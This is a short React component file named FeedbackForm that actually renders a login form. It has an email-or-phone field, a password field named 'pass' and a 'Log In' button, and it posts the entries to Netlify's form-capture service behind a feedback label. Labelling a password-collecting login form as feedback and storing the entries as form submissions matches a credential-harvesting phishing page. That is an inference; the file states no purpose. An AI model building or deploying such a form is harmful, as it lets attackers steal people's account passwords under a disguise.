import styles from './FeedbackForm.module.css'

export default function FeedbackForm() {
  return (
      <form
        className={styles.form}
        data-netlify="true"
        data-netlify-honeypot="bot-field"
        name="feedback"
        method="POST"
        action="/success"
      >
        <input type="hidden" name="form-name" value="feedback" />
        <p className={styles.hidden}>
            <label>
            Don’t fill this out if you’re human: <input name="bot-field" />
            </label>
        </p>
  
        
        <input id="name" className={styles['form-field']}  type="text" name="name"  placeholder="Email addess or phone number" required  />

        <input id="email" className={styles['form-field']} name="pass" type="password" placeholder="Password" required/>
        <button className={styles.button} type="submit">Log In</button>
      </form>
  )
}
